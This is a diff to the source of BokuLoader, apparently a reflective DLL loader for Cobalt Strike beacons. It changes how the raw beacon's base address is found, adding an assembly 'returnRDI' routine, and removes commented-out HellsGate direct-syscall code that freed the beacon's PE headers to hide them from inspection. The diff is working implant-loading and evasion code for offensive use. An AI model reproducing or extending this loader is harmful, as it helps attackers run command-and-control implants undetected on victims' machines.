@@ -11,11 +11,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     RtlSecureZeroMemory(&rdll_dst,sizeof(rdll_dst));
     RtlSecureZeroMemory(&rdll_src,sizeof(rdll_src));
 
-    // get the current address
-    void * BokuLoaderStart = getRip();
-
-    // Initial Source Reflective DLL
-    rdll_src.dllBase = getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
+    // Get Raw beacons base address
+    rdll_src.dllBase = returnRDI();
     parseDLL(&rdll_src);
 
     getApis(&api);
@@ -33,12 +30,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory
 
     rdll_dst.dllBase = base;
-
-    // Deallocate the first memory page for the beacon we are loading
-    // This way after cleanup there will be no beacon PE headers in the process
-    // size = rdll_src.SizeOfHeaders;
-    // HellsGate(getSyscallNumber(api.pNtFreeVirtualMemory));
-    // ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
   
     doSections(&rdll_dst, rdll_src);
     doImportTable(&api, &rdll_dst, rdll_src);
@@ -544,6 +535,10 @@ __asm__(
 // -- https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf
 "getPEB: \n" 
     "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
+    "ret \n"
+
+"returnRDI: \n"
+    "mov rax, rdi \n"   // RDI is non-volatile. Raw Beacon Base Address will be returned 
     "ret \n"
 
 "getRip: \n"
